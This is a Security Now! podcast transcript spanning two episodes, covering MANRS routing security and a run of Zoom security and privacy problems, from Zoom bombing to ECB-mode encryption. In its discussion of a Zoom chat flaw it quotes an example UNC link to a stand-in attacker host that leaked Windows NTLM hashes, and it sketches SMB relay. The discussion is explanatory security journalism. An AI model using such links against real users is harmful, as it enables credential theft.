So they said:  "That's why in late 2018 the MANRS community formed a taskforce with representatives from Akamai, Azion, Cloudflare, Comcast, Facebook, Google, Microsoft, Nexica, Oracle, Telefonica, Redder, TORIX, and VeriSign, committed to developing a set of actions CDNs and cloud providers should take to improve routing security.  The outcome of that taskforce's work led to the creation of this new MANRS program."



So they said:  "The MANRS Content Delivery Network and Cloud Program lists six actions, of which five are mandatory to implement:  prevent propagation of incorrect routing information, prevent traffic from illegitimate source IP addresses, facilitate global operational communication and coordination, facilitate validation of routing information on a global scale, encourage MANRS adoption, and provide monitoring and debugging tools to peering partners."  That's the optional one.



They said:  "Program participation provides an opportunity to demonstrate attention to the security and sustainability of the Internet ecosystem and therefore dedication to providing high-quality services.  Any CDN or cloud provider that takes at least the five required actions above is welcome to join.  Besides enjoying improved security posture, MANRS participants also show their commitment to the sustainability and resilience of the Internet ecosystem by creating a secure network peering environment, preventing potential attacks at their border; encouraging better routing hygiene from your peering partners; signaling your organization's security-forward posture so it's good for PR; demonstrating responsible routing behavior; and improving operational efficiency for peering interconnections, minimizing incidents and providing more granular insight for troubleshooting."  So anyway, it goes on talking about why is router security important, and BGP and so forth.  But we've already talked about that.



So anyway, this represents, I think, a useful good significant step forward.  And, you know, there is no solution to the BGP routing problem, other than arranging to be smarter than just assuming that when a router receives an advertisement about route changes, that they are correct.  There may be another layer of technology on top that is necessary.  There were some, back when it was possible to guess TCP sequence numbers, since BGP operates over standard IP protocol, back when sequence number guessing was possible, it was possible to actually intercept the BGP peering connection between routers and inject fake ads, fake routing into the connection.  That's way more difficult these days due to the improvements in the underlying TCP protocol.  But still, maybe we need another layer of security, some way of authenticating this.  We don't have that yet.



But anyway, the idea of, you know, essentially the individual routing operators sort of considered this like, well, you know, everything's working.  It's probably not a big problem.  And I'm busy with other things.  So this is saying, you know, step up your game a bit.  Let's protect the whole Internet by doing the right thing.



Okay.  Zoom Go Boom.  Based in San Jose, California, Zoom Video Communications Inc. provides, as we know, a video conferencing-focused communications platform using desktop and web browser clients.  So you get cloud video conferencing, online meetings, group messaging.  There's also some group and private chat features in there in virtual online conferences.



While all of the online conferencing systems have seen a significant jump in their usage, once this outbreak of the coronavirus-driven COVID-19 disease forced virtually all physical meetings of any kind into cyberspace, for whatever reason, Zoom was the system that most caught on.  Maybe it sounds fun.  I don't know.  Apparently it was due to nearly instantaneous word-of-mouth spread.  You know, what do you use?  I use Zoom.  Okay, I'll use it, too.  And so it went.  And it's relatively easy to use.



However, creating something of a stress test for Zoom, the past month has shown that it's less easy to use it securely, that not using it securely can have immediate and often embarrassing consequences, that for many purposes it may not be practical to use it securely just because of logistics, and also some potentially serious bugs have surfaced as a consequence of the greater scrutiny which has been brought to bear.



So to get some sense of scale, Zoom's usage has skyrocketed from 10 million daily users before the coronavirus last December to now 200 million daily users, so a 20-fold user increase.  And that's resulted in a 535% increase in daily traffic to its download page, just in the last month.  The company itself went public a year ago last April, and its stock price recently peaked in mid-March at more than twice what it had been in December.  So it doubled while the rest of the Dow stocks crashed in the last few months.



The most apparent problem was that, in the rush to move online, many of Zoom's useful security features initially went unused.  As we know, adding a password to anything, especially if it's optional, makes that thing's use less simple, even though it makes it somewhat more secure.  So, and passwords on Zoom conferences are optional.  So early on, everything from boardroom meetings to schoolroom classes to online yoga were quickly placed online, initially without passwords.  Those organizing the meetings apparently gave little thought to the possibility that anyone would want to crash the party.



And there's like a Zoom meeting code, which I guess they figured was obscure enough.  But oh, what a mistake that was.  And you know, even if a password was added to a meeting, both the meeting's code and its "protecting" password must still be provided to everyone wishing to attend.  So when a school district posted its Zoom-based meeting codes and passwords on their public website, well, stand back.  The world now has a new term:  "Zoom bombing."  And it's become a sub-industry of its own.  And in retrospect, it was completely foreseeable that now we have every bored teenager now also stuck at home, on the Internet, just itching to cause some - and here comes my favorite word - mayhem.



Ars Technica briefly summed things up last Thursday, writing:  "With the coronavirus pandemic forcing millions of people to work, learn, and socialize from home, Zoom conferences are becoming a default method to connect.  And with popularity comes abuse.  Enter 'Zoom bombing,' the phenomenon of trolls intruding into other people's meetings for the sole purpose of harassing the attendees, usually by bombarding them with racist or sexually explicit images or statements."



Ars wrote:  "A small sample of the events over the past few days."  And they had three.  An attendee who disrupted an Alcohol Anonymous meeting by shouting misogynistic and anti-Semitic slurs, along with the statement "Alcohol is soooo good," according to Business Insider.  Meeting organizers eventually muted and removed the intruder, but only after more than half the participants had left.  Second example, a Zoom conference hosting students from the Orange County Public Schools system in Florida that was disrupted after an uninvited participant exposed himself to the class.  And third, an online meeting of black students at the University of Texas that was cut short when it was interrupted by visitors using racial slurs.  So typical hijinks.  But a problem when you're trying to do all this online.  And it's possible to have these meetings interrupted.



And not only can online conferences be held on the Internet, but Zoom bombing raids can also be organized using the Internet's social media tools just as easily.  ZDNet wrote:  "The Internet is rife with online communities where users can go and share Zoom conference codes and request that pranksters connect and hurl insults, play pornographic material, or make death threats against other participants in a practice called 'Zoom bombing' or a 'Zoom raid.'"



They said:  "These Zoom bombing incidents have rapidly increased to become a favorite pastime for all the teenagers stuck in their homes during quarantines.  From a niche prank that started on a derelict Discord channel, Zoom bombing," they wrote, "has now spread to enormous proportions, being so rampant these days that the FBI sent a nationwide alert last week urging companies, schools, and universities to take steps to secure their Zoom channels.  But as Zoom bombing became more popular, more pranksters wanted to join in the fun, and more users wanted their friends' Zoom meetings disrupted.  As the old saying goes," they wrote, "where there's a demand, there's always a supply.



"Over the course of the past week, the number of places on the public Internet where a Zoom raid can be requested from a gang of bored teenagers has exploded.  There are now more than 30 public Discord channels.  There are at least three subreddits, and multiple Twitter accounts where Zoom conference codes and passwords can be posted to be broadcast to the Internet.  And there are threads on at least three hacking forums where users are either sharing Zoom conference codes or techniques to discover live meetings."



Some examples of Discord posts revealed by PC Magazine's reporting include:  "Can anybody troll my science class at 9:15," or "I have a class in 30 minutes that I'll send a link for," or "My friend's going to give me the code to her high school pre-calc class tomorrow morning."



So as I noted above, Zoom does provide for password-protected meetings.  But when an entire class of teenagers at home are provided with the Zoom meeting code and its accompanying password, it's easy for any of them to post those credentials anonymously to get their virtual classroom disrupted by a friend or anybody on the Internet.



Now, fortunately, the Zoom system does offer some additional controls to control and prevent such disruption.  Zoom offers a virtual waiting room, where wannabe participants can be held, staged, and vetted before being admitted into the conference.  And once all vetted participants have been added, essentially once a virtual roll call is complete, Zoom conferences can be locked to prevent anyone else from wandering in late, very much like locking the classroom door once class has begun.  And it's also possible to prevent anyone other than the host from sharing their screen with the conference, which only makes sense, though it's not currently the default, since the system was originally meant to be open and friendly and collaborative.



So this is what's going to have to happen moving forward.  And of course all that requires much more hands-on management.  It's not nearly as simple as publicly posting the access codes and everything works smoothly, but welcome to the Internet.  That's the way it's going to have to be.



And that's the usage sides tip.  And I should mention that, since I posted the show notes, I just checked with Twitter, and there's at least one person who read through this already who's an admin at a company who is using Zoom and gave it the thumbs-up.  He said he appreciated and liked everything that I had suggested.  So it looks like this is good advice.



So as I said, that's the usage side, which has immediately become necessary for managing the rampant abuse of Zoom meetings.  Not surprisingly, as I said at the top, there were some technical problems that have surfaced as a result of more scrutiny being brought to bear.  Last Wednesday a piece in Ars Technica stated that:  "Users of Zoom for Windows beware:  The widely used software has a vulnerability that allows attackers to steal your operating system credentials."  They were quoting researchers, so perhaps that's what the researchers said.  It wasn't exactly true.  Though it's definitely a serious vulnerability, or it was.  It would be more correct to say that it was a credential impersonation attack.



The Zoom chat window could be used to send targeted Windows users a string of text that represented a network resource on the Windows device they were using.  The Zoom app for Windows would automatically convert these UNC - that's the Universal Naming Convention - strings such as \\attacker.baddomain.com\C$.  C is the default share, the default Windows share for your main C drive.  The Zoom app would convert these into clickable links.  If the target clicked on those links in the chat, on networks that are not locked down, Zoom would send the Windows usernames and the corresponding network NTLM v2 hashes to the address contained in the link, that is, out onto the public Internet to the attacker.



Attackers could then use these credentials to access those default shared network resources like C:, Outlook servers, storage devices, whatever.  And this is caused by the fact that a Windows network will accept the NT LANMAN, the NTLM hash, when authenticating a user.  That leaves the networks open to SMB Relay attacks that can be used to gain unauthorized access to various resources.  These attacks don't require cracking the hash to reverse it to its plaintext password.  Replaying the existing hash is sufficient for authentication.  And as I've said many times before, Microsoft has never really managed to make any of its in-house protocols secure, which is why none of them should ever be exposed to the Internet.



Okay.  So it's worth noting that since all of this is happening over port 445, any Zoom user who is behind an ISP, who is already proactively filtering the typical range of highly abused ports - I'm a Cox Cable user.  All of mine are filtered.  So those are typically ports 25 (SMTP), ports 137 through 139 (old-school file and printer sharing), and 445 (the new SMB port).  Those are typically all blocked.  So many home users were never in any danger.  They always have been protected from the remote exploitation of this flaw because the hacker's not able to get back in.  But it's way better not to have this problem.  And immediately upon having it brought to their attention, Zoom repaired and updated their client to close this hole.  So problem solved.  But it was there for a while, and spooky. 



And of course there's more.  It's been revealed that Zoom conference connections are not truly end-to-end encrypted, as they claim, and that Zoom is able to see all of their conference content unencrypted.  I can understand this, since hosting a massive conference with true end-to-end encryption would be a bit tricky.  All of the participants would need to be sharing a common symmetric key that Zoom itself didn't have access to.  Obviously, that can be done, and Zoom didn't have to do it the way it did.  But anyway, instead what's happened is each conference participant's data stream is encrypted to Zoom, but decrypted there, and subsequently reencrypted to all other participants.



LEO:  I think in general that's how a conference system would have to work.  You can't do end-to-end encryption if you're going to have a central server; right?  And somebody's got to mix it.



STEVE:  Actually, yeah, you are able to.  And apparently in some instances theirs does.  But if you turn on value-added features, then it doesn't happen.



Okay.  So also in subsequent research by Citizen Lab they found that Zoom was also vague about the type of encryption being used, and that the keys generated for cryptographic operations were being delivered to participants in a Zoom meeting through servers in China, even when all meeting participants and the Zoom subscriber's company were outside of China.  Apparently that was a mistake.  They did some quick footwork and explained it away and said that it's been fixed.  But it was happening for a while.



And the audio and video in each Zoom meeting is encrypted and decrypted with a single AES-128 cipher used in ECB mode, which is shared among all participants.  As we know, ECB mode is Electronic Code Book.  That is not a chaining cipher.  Each block is independently encrypted without dependence upon anything that came before.  The result is that patterns present in the plaintext are preserved through encryption, which is considered to be a serious security weakness.



Zoom's original privacy policy also came under criticism because it was possible for Zoom to collect extensive data about its users - videos, transcripts, and shared notes - and share it with third parties for profit.  Whoops.  On March 29th, Zoom tightened its privacy policy to state that it doesn't use data from meetings for any advertising.  But it does use the data when people visit its marketing websites, including its home pages, Zoom.us and Zoom.com.



Zoom's iOS app, like many apps which use the Facebook SDK, was found to be sending analytics data back to Facebook, even when the user doesn't have a linked Facebook account.  Zoom later removed that feature.  Zoom came under the lens for its attendee-tracking feature, which when enabled lets a host check if participants are clicking away from the main Zoom window during a call.  On April 2nd, it permanently removed the attendee attention tracker function.



Zoom was found to be using an undisclosed data mining feature that automatically matched users' names and email addresses to their LinkedIn profiles when they were signed in, even if they were anonymous or using a pseudonym during their call.  If another user in their meeting was subscribed to a service called LinkedIn Sales Navigator, they were able to access the LinkedIn profiles of other participants in their Zoom meetings without those users' knowledge or consent.  Zoom has now disabled that feature.



Vice Magazine discovered and revealed that Zoom was leaking thousands of users' email addresses and photos, and letting strangers initiate calls with each other.  It turned out that was because users with the same domain name in their email address - get this, Leo.  Users with the same domain name in their email address, that is, using lesser known email providers other than Gmail, Outlook, Hotmail, or Yahoo, which Zoom had special-cased, were being grouped together as if they worked for the same company.  Whoops.  Zoom has selectively blacklisted those domains, though the whole thing seems like a bad idea to me.



Last Friday the Washington Post reported that it was trivial to find video recordings made in Zoom by searching the Internet for the common file naming pattern that Zoom automatically applies to video recordings.  These videos were found on publicly accessible Amazon storage buckets.  It's not a biggie since that was relying upon obscurity rather than any security, but still.  Researchers have created a tool called "zWarDial" that searches for open Zoom meeting IDs, finding around 100 open and non-password protected meetings per hour.



The good news is Zoom has been responding to each and every one of these issues quickly.  And it does appear that, given its existing feature set, it can be used and put to good purpose so long as tight control is maintained over those who are allowed to participate.  Although exerting such control might be difficult for very large meetings, in a typical virtual classroom that ought to be workable.



Their use of AES-128 in ECB mode is a red flag from a strict security standpoint.  It basically means that Zoom implemented its own cryptographic system, which is not, you know, it's obvious to anyone looking at it, not very secure.  I can see the benefits of using ECB mode for a multiway conferencing system.  It makes things much easier, allowing latecomers to more easily join into the fray.  But users should not assume that they have truly secure end-to-end encryption.  Apparently no one using Zoom really does.  But with that caveat, okay, for many people it doesn't matter.  For an otherwise public classroom or a yoga class, it's entirely sufficient.



So that's where Zoom is.  And I didn't want to finish talking about this without mentioning Jitsi Meet.  If any of the listeners of this podcast are interested in exploring the possibility of quickly assembling their own private, truly secure videoconferencing system, I've been looking at Jitsi, and I would recommend checking out this free and open source Jitsi Meet system.  And Leo, I heard you mentioning it just in the previous podcast.



LEO:  Yeah, I set our own server up.  We have our own at twit.team.



STEVE:  Oh, cool.



LEO:  Running off my Linux box at home.  It's very easy to install.



STEVE:  Yeah, nice.



LEO:  It's trivial to install.



STEVE:  Yeah, yeah.



LEO:  I should point out I set it up, but we still use Zoom on all of our sales calls, all our group meetings.  It's just so easy.  I think Jitsi's easier because it's WebRTC, so it's just a web link.



STEVE:  Yup, yup.



LEO:  And you can make reasonable names like twit.team/securitynow, and everybody can remember it.  It's logical.  You can protect it.  In fact, I actually protected it too much.  I did a mass one during MacBreak Weekly, and then realized I forgot to open up a UDP port for the video.  So I have to go back.  I have a port open, it's a 443 because it does Let's Encrypt.  But I need to open a port...



STEVE:  In order for the actual video conferencing to transit.



LEO:  Yeah, yeah.  Well, I've had conferences.  But for some reason here I can't do it, so I'm not sure what's going on.  I don't know.



STEVE:  Well, they say that the technology is interesting.  They have what they call the "Jitsi Videobridge," and they say it passes everyone's video and audio to all participants, rather than mixing them first.



LEO:  Right.



STEVE:  The result is lower latency, better quality, and if you're running your own service, a much more scalable and inexpensive solution.



LEO:  Yeah.  I'm running on 20 megabits up.  You know, it uses very little CPU and doesn't use much bandwidth.



STEVE:  Yeah, well, it sounds like it establishes point-to-point links among all the participants so everything goes to everyone.



LEO:  Right.



STEVE:  Rather than everything funneling through a central server.



LEO:  Right.



STEVE:  So anyway, for our listeners who are interested, it's open source, well designed, standards based, WebRTC as you mentioned.  It understands simulcast, bandwidth estimation, scalable video coding, state-of-the-art technologies.  Servers are available for Ubuntu and Debian.  It's got clients for all web and desktop.  Jitsi.org/jitsi-meet.  So I just, after looking at Zoom, I thought, well, let's take a look at a really good one.



LEO:  And so great and easy.



STEVE:  I loved your anecdote.  But yeah, we got Jitsi.  But [crosstalk].



LEO:  I keep telling Lisa, we pay for Zoom.  I keep telling Lisa, I got a free one.  It uses our TWiT name.  You know, I got a domain.  It took me literally 10 minutes.  The longest time was just going to Hover and getting a domain name and moving the DNS.  It's so simple to set up.  It's one line.  If you want to, now, it's a little more complicated if you want a conference bridge because it doesn't have a phone bridge.  But you can use a SIP system.  I haven't set that up.  But it has another piece called Jigasi that does a SIP for conference, for phone bridging into it.  So it's pretty full featured.  It's nice.  I like it.



STEVE:  Nice.



LEO:  Yeah.



STEVE:  Well, and there is everything you wanted to know about Zoom Go Boom.  You know, it's what the world is using.  It's clear that the world needs to take it seriously now that this whole, I mean, if you have - now that there's a war dialer, if you have a non-password-protected conference where you're even protecting, you know, you're not publishing the conference ID, you could still get found.  So you've got to put a password on it.  Obviously you want to keep your conference IDs and passwords as private as possible.  It's not going to happen if you're trying to teach a student, a high school class of kids.



LEO:  This is the problem.  And the big problem is, you know, I have friends in 12-step programs, and they are doing their meetings using Zoom.  The problem is you have to make that public because there's no point in having a recovery meeting if you can't make it public.  So they don't want to password-protect it.  They can use the lobby, but that's not really even practical.  So that's the problem.  These public meetings are going to be Zoom bombed.  And it is not fun for all when they Zoom bomb them.  They use racial epithets.  They do targeted attacks.  They do triggering stuff.  Lot of porno.  It's really creepy people who are doing this.  It's not fun little, oh, get my class and shut it down.  It's nasty.  It's nasty.  Brings out the worst in people.  And, you know, even Jitsi wouldn't fix this because you have to make it public.  Public is public.



STEVE:  Yeah.



LEO:  What you need is good moderation tools.



STEVE:  Yes.



LEO:  And even then you're going to have problems.



STEVE:  Yeah.



LEO:  Steve Gibson.  You can find this show at GRC.com.  That's where Steve hangs his hat, the Gibson Research Corporation.  He has 16Kb audio, 64Kb audio, beautifully written transcription, you know, in text so you can read along as you listen.  He also has SpinRite, the world's finest hard drive maintenance and recovery utility, and of course lots of other free stuff there, including the world-famous ShieldsUP!.  It's all at GRC.com.



Leave him feedback.  Every once in a while I get email saying, "I need to get this to Steve."  It's easy.  Go to GRC.com/feedback.  Or even better, he's on Twitter.  Go to @SGgrc.  He accepts DMs from anybody, and you can DM him there, too.  It's a lot easier.  You can reach him more directly.  Actually, it's easier to reach him than it is to reach me.  I don't want to be as available as you want to.  You're a brave man, Steve Gibson.



You can find the show at our website, too, TWiT.tv/sn.  Not only do we have audio, we have video.  If you want to watch, you can.  It's also on YouTube, youtube.com, I think it's "securitynowshow."  Actually, go to youtube.com/twit, that's the main channel, and then all the other channels are referred to there.  You can follow the links.  Either way, subscribe, whether it's on YouTube or in your podcast.  That way you'll know the minute it's available, and you can collect all 700 and, what is it, 62?



STEVE:  61.



LEO:  761 episodes.  They're all yours for the asking.  I meet people all the time, it's almost a geek rite of passage:  "Yes, I've listened to the first 650.  I'm almost caught up."



STEVE:  Cool.



LEO:  It is.  That's my reaction, is like, wow, that's great.  Well done.  Steve, stay safe in your Fortress of Solitude.  Keep your mask on, your spirits up, and we will see you next week on Security Now!, my friend.  



STEVE:  Thanks, buddy.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#762

DATE:		April 14, 2020

TITLE:		Virus Contact Tracing

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-762.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we follow-up on a bunch of continuing Zoom news, since Zoom appears to be poised to become the teleconferencing platform of choice for the world at large.  They've made more changes, have been sued, and have been rapidly taking steps to fix their remaining problems.  We have some browser news and another worrisome look into Android apps using a novel approach to quickly characterize them.  We have an interesting and sad bit of miscellany, a progress report on my SpinRite work, and then we take the sort of full technical deep dive into the joint Apple/Google Contact Tracing system that our listeners have come to expect from this podcast.  By the end of this podcast everyone will understand exactly what Apple and Google have done and how the system functions, in detail.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson's here.  There is, of course, lots to talk about.  A farewell to a guy who was very inspirational to both Steve and me in our youth, another victim of COVID-19.  And then Steve will talk about Apple and Google's plan to support quarantine and tracking using your iPhone and Android.  Steve breaks it down, says how it works, and explains how it can be used without invading privacy.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 762, recorded Tuesday, April 14th, 2020:  Virus Contact Tracking.



It's time for Security Now!, with a sassy Steve Gibson of GRC.com.



STEVE GIBSON:  Now, you're going to have to explain that, Leo.



LEO:  I went to - so I'm not going to say what it is.  But if you mistype twitter.com/sggrc, which is his Twitter handle, if you just slightly mistype it, you get somebody called Sassy GRC, who has been a member since 2012 with that account.  So they're not some fly-by-night trying to steal your thunder.



STEVE:  And I've never been called "sassy," so we know that's not me.



LEO:  Well, I think you're kind of sassy.  You've been in sassy moods.



STEVE:  So to no one's surprise, this week we're going to take a deep technical dive into what exactly it is that Apple and Google have combined their intelligences to design.



LEO:  Oh, good.



STEVE:  So, but we've got a bunch of stuff to talk about.  We're going to follow up on a bunch of continuing Zoom news, since Zoom appears to be poised to become the teleconferencing platform of choice for the world.  They've made more changes.  They've been sued, of course.  And they are rapidly taking steps to fix their remaining problems.  So I wanted, since that was Zoom Go Boom was last week's topic, I wanted to sort of catch up on what's been happening since.



We've got some browser news.  Another worrisome look, I heard you talking about Android, Leo, on MacBreak Weekly, and I couldn't agree with you more.  It's just we've got some more worrisome news from taking a look at Android apps using a novel approach to quickly characterize them and what was found.  We've got an interesting and sad bit of miscellany, and I know you already know what it is.



LEO:  I do.



STEVE:  And a progress report on SpinRite which is all good news.  And then we're going to take a full technical deep dive into the joint Apple/Google contact tracing system, to the level that our listeners have come to expect from this podcast.  And by the end of the podcast, everyone will understand exactly what Google and Apple have done, how the systems function in detail, and what it means.  And I'm expecting that we'll have some time for you and me, Leo, to talk about, sort of to put this into context in terms of abuse and bad news and so forth.



There's been a lot of misunderstanding.  I'm hearing people talking about things, I mean, even Moxie, who we know is capable of understanding this, he shot off a bunch of tweets right off the bat, I'm sure before he read the spec, which were completely incorrect about some of the system's problems.  It sounds like subsequently he understands how the thing works better.  But anyway, we're going to have a great podcast for our listeners once again.



LEO:  Yeah.  He had some real concerns, but I'm glad you're going to address this because I shared them.



STEVE:  Yes.  There's no megabytes or gigabytes of data upload/download.  That's all incorrect.



LEO:  Oh, good.  Oh, good.



STEVE:  Yup.



LEO:  He envisioned a DDoS attack using this.



STEVE:  Bottom line is these guys really nailed it as an underlying platform from which more can be built.  So anyway, I think a great podcast.



LEO:  And that's exactly what Rene and the team on Tuesday, you know, earlier today concluded is, look, you've got two of the best companies in the world doing this, that nothing's going to be that surprising to them.  They've thought of the these already.



STEVE:  Yes.  I thought Andy summed it up perfectly, which is he would far rather have these two companies that understand the technology and have been so much attacked in the past, rather than some random government agency saying, well, [crosstalk].



LEO:  Right.  We can do this.  Yeah.



STEVE:  Yeah.



LEO:  No, but also they own the platforms.  And so it's only sensible that they should be the ones that come up with the API.  But we'll talk about it.  I'm glad you're going to talk about this because I also think it's kind of clever.  I think it's very interesting.



STEVE:  It's really cool how it works.  Our listeners are going to love the way it works from a technical standpoint.  And it wouldn't do us any good to have it a year from now, which is what the government would provide.



LEO:  A year.



STEVE:  We need it in two weeks.



LEO:  Give it to Boeing.  We'll have it flying in 10 years.



STEVE:  So our Picture of the Week, thanks to a Twitter follower, sent this.  I got a kick out of this because this is something that we've all seen.  In this picture we have two construction workers, one with a sledgehammer, that have just blasted, like pounded a hole in someone's wall and interrupted the family meal.  Mom and Dad are both looking in horror and shock at this big hole, and the kids are hiding behind their chairs.  Actually it looks like little Susie is in a wheelchair, so a little more vulnerable.  And one of them, from his hard hat, is saying, "Hi, we've changed your privacy settings."  Meaning, yes, the privacy policy is changed after we're already using the product.



LEO:  Ain't nothin' you can do about it.



STEVE:  That's right.



LEO:  You've got a big hole.



STEVE:  We decided after looking at all the information we've been collecting, we could monetize this sucker.  So, yeah.  Anyway, fun cartoon, and thank you for the pointer.



Okay.  Some Zoom follow-ups.  They rushed out, Zoom rushed out another Zoom bombing mitigation.  Until these three Zoom desktop clients were updated for Linux, Mac, and Windows, they were prominently, and originally conveniently, probably, displaying the current Zoom meeting ID in each app's title bar.  This behavior, which had presumably caused no trouble at all during Zoom's first nine years of life, since its birth back in 2011, had suddenly become a significant liability as new Zoomers were sharing screen shots of their Zoom meetings on social media, without stopping to consider that their meeting ID was also being shared because the screenshot contained the title bar.  So, whoops.



As we just talked about last week, yes, there were some problems, some fundamental problems with Zoom.  But a lot of the problems ended up just being a manifestation of the insane overnight popularity of Zoom, things that suddenly when everyone started using it and hadn't had a lot of experience using it, they were doing things that they shouldn't have been doing.  So there was an across-the-board update.  The meeting ID has been moved from, well, removed from the title bar and placed into a drop-down panel for the sessions info icon, which is in the top left of the Zoom app.  So there's just a little "i" circled thing.  You click on it, and you can get the meeting ID from there.  Which in a mature app is probably where it should be since we now know that just the Zoom ID itself can be abused.



Additionally, they've made the management and presumably the need for security-related settings more obvious to a meeting's hosts.  Last week's update also added a new dedicated security icon to the app's control panel, where the meeting organizer can manage all security-related settings from a single location, rather than, as they were previously, having them scattered all over the place, and they had to like bounce around among separate dialogs in order to find them all.  So these new settings include all the things we talked about last week - the ability to lock meetings, to enable the waiting room, and more.



Oh, and they added another feature.  Meeting hosts are now able to enable meeting rooms on the fly, even if the feature was turned off before the start of the meeting, which hadn't been possible before.  That had to be set up in the original configuration of the meeting before it was started.  That they fixed.  And it'll also be less often needed since the update now also enables waiting rooms by default for all new meetings.  And it also mandates that all new conferences be password protected.  So again, I probably sounded a little upbeat about the speed with which Zoom was addressing these problems.  And I continue feeling that they are being very responsible.  You know, it went mainstream and lost its innocence pretty quickly.



And predictably, speaking of losing its innocence, last Tuesday one of the company's shareholders, a Michael Drieu, filed a class-action lawsuit on behalf of all other shareholders.  The suit alleges that Zoom made "materially false and misleading statements" that overstated its privacy and security measures; that it engaged in deception when it claimed that its product supported end-to-end encryption - well, it does in some cases; but as we know, not with the strength that we're used to - and also alleges that Zoom only uses encryption for the transport link, allowing the service to still access user data and putting users "at an increased risk of having their personal information accessed by unauthorized parties, including Facebook."  So, yeah.  This is going to happen.  And who knows how this will settle out.  But, you know, it will.



Meanwhile, Zoom has enlisted the aid of someone who's moderately famous, and that's Alex Stamos.  They reached out to Alex, who previously worked at Facebook, and before that at Yahoo, as their, well, he's not their, well, he worked there, Facebook and then Yahoo, as the CISO, their Chief Information Security Officer.  And as we know, Alex departed Facebook two years ago, back in 2018, in protest over Facebook's handling of data security practices surrounding the Cambridge Analytica fiasco and Russian interference in the 2016 U.S. presidential election.  Alex had had his eye on Facebook's Russian activity since around the summer of 2016 and wanted the company to go public with his findings.  But Facebook's top execs, including Zuck, refused to allow that to happen, so he said, I think this is not where I want to be.



He's now very busy being an adjunct professor at Stanford's Freeman Spogli Institute, and a visiting scholar at the Hoover Institution.  And in a posting of his on Medium last Wednesday he said he felt compelled to assist Zoom even though he's consumed by other commitments.  I really liked what Alex wrote, and we've got time, so I wanted to share it with our listeners.



He said in his posting on Medium:  "Last week, after I posted a series of tweets discussing the security challenges for Zoom and how they could respond, I got a phone call from Eric Yuan, Zoom's founder and CEO.  We talked about the significant challenges his company was facing, both in responding to an incredible growth in users, but also living up to the security expectations of the moment.  He asked detailed and thoughtful questions of my experiences working at companies facing extreme crises, and I was impressed by his clear vision for Zoom as a trusted platform and his willingness to take aggressive action to get there.  He asked if I would be interested in helping Zoom build up its security, privacy, and safety capabilities as an outside consultant, and I readily agreed."



And Alex said:  "To be clear, I'm not an employee or an executive of Zoom, and I don't speak for the company.  I have refrained from any public comment on Zoom or discussions with journalists since my call with Eric.  But in the interest of transparency, I think it's important to disclose this work.  I don't do a lot of consulting these days.  I'm generally quite busy with my role at Stanford, and I'm proud of the work that team has been doing during this critical time for disinformation.  This opportunity to consult with Zoom was too interesting to pass up, however, and I thought I would explain why I have embraced this challenge.



"First off, Zoom has gone from being a successful mid-size enterprise IT company to a critical part of the lives of hundreds of millions in the space of a few months.  As my CV might suggest, I am attracted to difficult problems, and this creates some doozies.  As someone who has walked through the galaxy of blinking lights and deafening whir of tens of thousands of servers carrying the sessions of millions of users, I appreciate the effort it takes to build a product that scales. To successfully scale a video-heavy platform to such size, with no appreciable downtime, in the space of weeks is literally unprecedented in the history of the Internet.  It has been clear to many people who have worked on production-scale systems that something special has been happening at Zoom, and the related security challenges are fascinating.



"It's not just the technical challenges that I am interested in. In a time of global crisis, Zoom has become a critical link between co-workers, family, friends, and most importantly between teachers and students.  The morning Eric called me," he said, "(and most mornings since), there were five simultaneous Zoom sessions emerging from my home, as my three kids recited the Pledge of Allegiance in their virtual morning assembly, my wife supported her middle-school students, and I participated in a morning standup with my Stanford colleagues.  Like many techies, I've used Zoom professionally for a while.  But I admit that there was still a bit of culture shock as my wife taped a daily calendar full of Zoom meeting codes to our eight year-old daughter's desk.



"The adaptation of a successful enterprise collaboration tool into virtual classrooms, virtual doctors' offices, and a myriad of other applications including at least one virtual Cabinet Room, has created privacy, trust, and security challenges that no company has ever faced.  As I told the computer science students in my Trust and Safety Engineering course this last quarter - the last two weeks of which were taught over, yes, Zoom - coding flaws and cryptographic issues are important, but the vast majority of real technological harm to individuals comes from people using products in a technically correct but harmful manner.  Zoom has some important work to do in core application security, cryptographic design, and infrastructure security, and I'm looking forward to working with Zoom's engineering teams on those projects."



And he finishes, saying:  "Still, I'm certain that the real challenge, one faced by every company trying to provide for the diverse needs of millions seeking low-friction collaboration, is how to empower one's customers without empowering those who wish to abuse them.  I encourage the entire industry to use this moment to reflect on their own security practices and have honest conversations about things we could all be doing better. This is possibly the most impactful challenge faced by the tech industry in the age of COVID-19, and together we can make something positive out of these difficult times and ensure that communications are safer and more secure for all."



So anyway, I thought that was a great piece of communication.  And I think it really nicely sort of frames where Zoom is.  And again, I'm impressed with the idea that Eric, the Zoom CEO, would proactively reach out to Alex and say, hey, you've been in the middle of this before.  Would you be willing to give us a hand?



And following up on that, last Wednesday, the day before Alex Stamos's blog posting on Medium, Zoom's CEO Eric Yuan also announced that Zoom had formed a CISO Council and an Advisory Board to collaborate and share ideas regarding how to address Zoom's current security and privacy issues.  In his announcement  he wrote:  "I'm truly humbled that, in less than a week after announcing our 90-day plan, some of the most well-respected CISOs in the world have offered us their time and services.  This includes CISOs from VMware, Netflix, Uber, Electronic Arts, HSBC, NTT Data, Procore, and Ellie Mae."  He said:  "The purpose of the CISO Council will be to engage with us in ongoing dialogue about privacy, security, and technology issues and best practices to share ideas and collaborate."



So anyway, I think these are all good moves.  As I noted last week, no one has yet taken a deep look into their crypto, and someone needs to.  What we've seen is that their ECM, their Electronic Codebook Mode of crypto, is also most certainly leaking repeating patterns from plain text.  And that suggests that it really needs a closer look.  If they've more deeply rolled their own crypto solutions, and if Zoom is headed toward becoming the world's teleconferencing platform of choice, then one thing Zoom's CEO ought to do, and perhaps Alex or one of the CISOs will recommend it if they haven't already, would be to open their system to an independent security audit.



